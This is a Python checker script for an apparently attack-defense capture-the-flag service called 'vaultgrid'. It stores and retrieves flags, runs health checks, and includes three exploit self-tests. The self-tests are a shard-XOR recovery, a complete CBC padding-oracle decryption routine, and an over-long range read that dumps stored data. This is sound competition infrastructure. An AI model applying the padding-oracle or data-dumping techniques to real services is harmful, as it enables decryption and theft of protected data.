from __future__ import annotations

import base64
import json
import os
import secrets
import string
from logging import LoggerAdapter
from typing import Any

from enochecker3 import (
    ChainDB,
    Enochecker,
    ExploitCheckerTaskMessage,
    GetflagCheckerTaskMessage,
    GetnoiseCheckerTaskMessage,
    HavocCheckerTaskMessage,
    InternalErrorException,
    MumbleException,
    PutflagCheckerTaskMessage,
    PutnoiseCheckerTaskMessage,
)
from enochecker3.utils import FlagSearcher
from httpx import AsyncClient

checker = Enochecker("vaultgrid", 8080)
app = lambda: checker.app

ALPHABET = string.ascii_lowercase + string.digits


def noise_word(n: int = 10) -> str:
    return "".join(secrets.choice(ALPHABET) for _ in range(n))


def service_secret() -> str:
    return os.environ.get("SERVICE_PUSH_SECRET", "rotate-secret")


def header_secret() -> dict[str, str]:
    return {"X-Checker-Secret": service_secret()}


async def expect_status(r, code: int, what: str) -> None:
    if r.status_code != code:
        raise MumbleException(f"{what}: expected {code}, got {r.status_code} body={r.text[:200]}")


async def task(client: AsyncClient, method: str, tick: int, variant: int, flag: str | None = None) -> dict[str, Any]:
    payload: dict[str, Any] = {
        "method": method,
        "current_round_id": tick,
        "related_round_id": tick,
        "variant_id": variant,
        "flag": flag,
        "timeout": 8000,
        "round_length": 60_000,
    }
    r = await client.post("/", json=payload, headers=header_secret())
    await expect_status(r, 200, f"{method} v{variant}")
    body = r.json()
    result = body.get("result")
    if result == "OK":
        return body
    if result in {"DOWN", "INTERNAL_ERROR"}:
        raise InternalErrorException(f"{method} v{variant}: {body}")
    raise MumbleException(f"{method} v{variant}: {body}")


# ---------------------------------------------------------------------------
# variant 0 — shard repair (HMAC scope confusion)
# ---------------------------------------------------------------------------

@checker.putflag(0)
async def putflag_shard(task_msg: PutflagCheckerTaskMessage, logger: LoggerAdapter, client: AsyncClient, db: ChainDB) -> str:
    result = await task(client, "PUTFLAG", task_msg.current_round_id, 0, task_msg.flag)
    info_raw = result.get("attack_info") or ""
    info = json.loads(info_raw)
    if int(info.get("p", -1)) != 0:
        raise MumbleException("putflag_shard: wrong variant")
    await db.set("v0", {"info": info, "flag": task_msg.flag})
    return info_raw


@checker.getflag(0)
async def getflag_shard(task_msg: GetflagCheckerTaskMessage, logger: LoggerAdapter, client: AsyncClient, db: ChainDB) -> None:
    saved = await db.get("v0")
    if saved.get("flag") != task_msg.flag:
        raise MumbleException("getflag_shard: drift")
    await task(client, "GETFLAG", task_msg.current_round_id, 0, task_msg.flag)
    objects = (await client.get("/api/objects")).json().get("objects") or []
    if not any(o.get("object") == saved["info"]["a"] for o in objects):
        raise MumbleException("vault object missing from listing")


# ---------------------------------------------------------------------------
# variant 1 — manifest (CBC padding oracle)
# ---------------------------------------------------------------------------

@checker.putflag(1)
async def putflag_manifest(task_msg: PutflagCheckerTaskMessage, logger: LoggerAdapter, client: AsyncClient, db: ChainDB) -> str:
    result = await task(client, "PUTFLAG", task_msg.current_round_id, 1, task_msg.flag)
    info_raw = result.get("attack_info") or ""
    info = json.loads(info_raw)
    if int(info.get("p", -1)) != 1:
        raise MumbleException("putflag_manifest: wrong variant")
    for field in ("a", "b", "iv", "ciphertext"):
        if field not in info:
            raise MumbleException(f"putflag_manifest: missing {field}")
    await db.set("v1", {"info": info, "flag": task_msg.flag})
    return info_raw


@checker.getflag(1)
async def getflag_manifest(task_msg: GetflagCheckerTaskMessage, logger: LoggerAdapter, client: AsyncClient, db: ChainDB) -> None:
    saved = await db.get("v1")
    if saved.get("flag") != task_msg.flag:
        raise MumbleException("getflag_manifest: drift")
    await task(client, "GETFLAG", task_msg.current_round_id, 1, task_msg.flag)


# ---------------------------------------------------------------------------
# variant 2 — feed record (length confusion / range dump)
# ---------------------------------------------------------------------------

@checker.putflag(2)
async def putflag_feed(task_msg: PutflagCheckerTaskMessage, logger: LoggerAdapter, client: AsyncClient, db: ChainDB) -> str:
    result = await task(client, "PUTFLAG", task_msg.current_round_id, 2, task_msg.flag)
    info_raw = result.get("attack_info") or ""
    info = json.loads(info_raw)
    if int(info.get("p", -1)) != 2:
        raise MumbleException("putflag_feed: wrong variant")
    await db.set("v2", {"info": info, "flag": task_msg.flag})
    return info_raw


@checker.getflag(2)
async def getflag_feed(task_msg: GetflagCheckerTaskMessage, logger: LoggerAdapter, client: AsyncClient, db: ChainDB) -> None:
    saved = await db.get("v2")
    if saved.get("flag") != task_msg.flag:
        raise MumbleException("getflag_feed: drift")
    await task(client, "GETFLAG", task_msg.current_round_id, 2, task_msg.flag)


# ---------------------------------------------------------------------------
# noise
# ---------------------------------------------------------------------------

@checker.putnoise(0)
async def putnoise_shard(task_msg, logger, client):
    await task(client, "PUTNOISE", task_msg.current_round_id, 0)

@checker.getnoise(0)
async def getnoise_shard(task_msg, logger, client):
    await task(client, "GETNOISE", task_msg.current_round_id, 0)

@checker.putnoise(1)
async def putnoise_manifest(task_msg, logger, client):
    await task(client, "PUTNOISE", task_msg.current_round_id, 1)

@checker.getnoise(1)
async def getnoise_manifest(task_msg, logger, client):
    await task(client, "GETNOISE", task_msg.current_round_id, 1)

@checker.putnoise(2)
async def putnoise_feed(task_msg, logger, client):
    await task(client, "PUTNOISE", task_msg.current_round_id, 2)

@checker.getnoise(2)
async def getnoise_feed(task_msg, logger, client):
    await task(client, "GETNOISE", task_msg.current_round_id, 2)


# ---------------------------------------------------------------------------
# havoc
# ---------------------------------------------------------------------------

@checker.havoc(0)
async def havoc_health(task_msg, logger, client):
    for path in ("/health", "/whoami"):
        r = await client.get(path)
        await expect_status(r, 200, f"havoc health {path}")

@checker.havoc(1)
async def havoc_accounts(task_msg, logger, client):
    creds = {"username": f"hv1_{noise_word()}", "password": noise_word(20)}
    r = await client.post("/api/accounts/register", json=creds)
    if r.status_code not in (200, 409):
        raise MumbleException(f"register http {r.status_code}")
    me = await client.get("/api/accounts/me")
    await expect_status(me, 200, "havoc accounts me")
    out = await client.post("/api/accounts/logout")
    await expect_status(out, 200, "havoc accounts logout")

@checker.havoc(2)
async def havoc_objects(task_msg, logger, client):
    objs = await client.get("/api/objects")
    await expect_status(objs, 200, "havoc objects list")
    body = objs.json()
    if "objects" not in body:
        raise MumbleException("objects shape")

@checker.havoc(3)
async def havoc_manifests_list(task_msg, logger, client):
    r = await client.get("/api/crypt/manifests?tenant=public")
    await expect_status(r, 200, "havoc manifests list")
    if "manifests" not in r.json():
        raise MumbleException("manifests shape")

@checker.havoc(4)
async def havoc_feed_records(task_msg, logger, client):
    r = await client.get("/api/feed/records?tenant=public")
    await expect_status(r, 200, "havoc feed records")
    if "records" not in r.json():
        raise MumbleException("records shape")

@checker.havoc(5)
async def havoc_indexer_stats(task_msg, logger, client):
    r = await client.get("/api/indexer/stats")
    await expect_status(r, 200, "havoc indexer")
    body = r.json()
    if "objects" not in body or "audit" not in body:
        raise MumbleException("indexer shape")

@checker.havoc(6)
async def havoc_rebuild_no_body(task_msg, logger, client, db):
    # Negative assertion: rebuild must not surface a known flag in plaintext.
    saved = await db.get("v0")
    obj_id = saved["info"]["a"]
    r = await client.post("/api/rebuild", json={"object": obj_id})
    await expect_status(r, 200, "havoc rebuild")
    body = r.text
    if saved["flag"] in body:
        raise MumbleException("rebuild leaked flag")

@checker.havoc(7)
async def havoc_meta(task_msg, logger, client, db):
    saved = await db.get("v0")
    meta_id = saved["info"]["c"]
    r = await client.get(f"/api/meta/{meta_id}")
    await expect_status(r, 200, "havoc meta")
    body = r.text
    if saved["flag"] in body:
        raise MumbleException("meta leaked flag")

@checker.havoc(8)
async def havoc_proxy_health(task_msg, logger, client):
    # The vaultgrid proxy must reach both sidecars.
    r = await client.get("/api/crypt/manifests?tenant=public")
    await expect_status(r, 200, "havoc proxy crypt")
    r = await client.get("/api/feed/records?tenant=public")
    await expect_status(r, 200, "havoc proxy feed")


# ---------------------------------------------------------------------------
# exploit self-tests
# ---------------------------------------------------------------------------

@checker.exploit(0)
async def exploit_shard(task_msg: ExploitCheckerTaskMessage, logger, client, searcher: FlagSearcher) -> str:
    info = json.loads(task_msg.attack_info)
    if int(info.get("p", -1)) != 0:
        raise InternalErrorException("wrong variant")
    object_id = info["a"]
    lease_id = info["b"]
    ticket = (await client.get(f"/api/lease/{lease_id}/ticket")).json()["ticket"]
    shards = []
    for s in ("s0", "s1", "s2"):
        r = await client.get(f"/api/repair/{object_id}/{s}", params={"ticket": ticket})
        if r.status_code != 200:
            raise MumbleException(f"shard {s}: {r.status_code}")
        shards.append(bytes.fromhex(r.json()["hex"]))
    width = min(len(b) for b in shards)
    recovered = bytes(a ^ b ^ c for a, b, c in zip(shards[0][:width], shards[1][:width], shards[2][:width]))
    flag = searcher.search_flag(recovered.decode("latin-1", errors="replace"))
    if not flag:
        raise MumbleException("exploit_shard: flag missing from xor")
    return flag


@checker.exploit(1)
async def exploit_manifest(task_msg: ExploitCheckerTaskMessage, logger, client, searcher: FlagSearcher) -> str:
    info = json.loads(task_msg.attack_info)
    if int(info.get("p", -1)) != 1:
        raise InternalErrorException("wrong variant")
    tenant = info["b"]
    iv = bytes.fromhex(info["iv"])
    ct = bytes.fromhex(info["ciphertext"])
    blocks = [ct[i : i + 16] for i in range(0, len(ct), 16)]
    pt = b""
    prev = iv

    async def oracle(prev_block: bytes, target_block: bytes) -> bool:
        r = await client.get(
            "/api/crypt/decrypt",
            params={"tenant": tenant, "iv": prev_block.hex(), "ct": target_block.hex()},
        )
        return r.status_code != 400

    for blk in blocks:
        intermediate = bytearray(16)
        for j in range(15, -1, -1):
            pad = 16 - j
            suffix = bytearray(16)
            for k in range(j + 1, 16):
                suffix[k] = intermediate[k] ^ pad
            found = None
            for candidate in range(256):
                suffix[j] = candidate
                if not await oracle(bytes(suffix), blk):
                    continue
                if j == 15:
                    check = bytearray(suffix)
                    check[14] ^= 1
                    if await oracle(bytes(check), blk):
                        found = candidate
                        break
                else:
                    found = candidate
                    break
            if found is None:
                raise MumbleException("padding oracle exhausted")
            intermediate[j] = found ^ pad
        pt += bytes(intermediate[i] ^ prev[i] for i in range(16))
        prev = blk
    if pt and 1 <= pt[-1] <= 16 and pt[-pt[-1] :] == bytes([pt[-1]]) * pt[-1]:
        pt = pt[: -pt[-1]]
    flag = searcher.search_flag(pt.decode("latin-1", errors="replace"))
    if not flag:
        raise MumbleException("exploit_manifest: flag missing")
    return flag


@checker.exploit(2)
async def exploit_feed(task_msg: ExploitCheckerTaskMessage, logger, client, searcher: FlagSearcher) -> str:
    info = json.loads(task_msg.attack_info)
    if int(info.get("p", -1)) != 2:
        raise InternalErrorException("wrong variant")
    offset = int(info.get("offset", 0))
    length = int(info.get("length", 256))
    start = max(0, offset - 8)
    span = max(length + 64, 256)
    r = await client.get("/api/feed/range", params={"offset": start, "length": span})
    if r.status_code != 200:
        raise MumbleException(f"range http {r.status_code}")
    blob = bytes.fromhex(r.json()["hex"])
    text = blob.decode("latin-1", errors="replace")
    flag = searcher.search_flag(text)
    if not flag:
        raise MumbleException("exploit_feed: flag missing")
    return flag
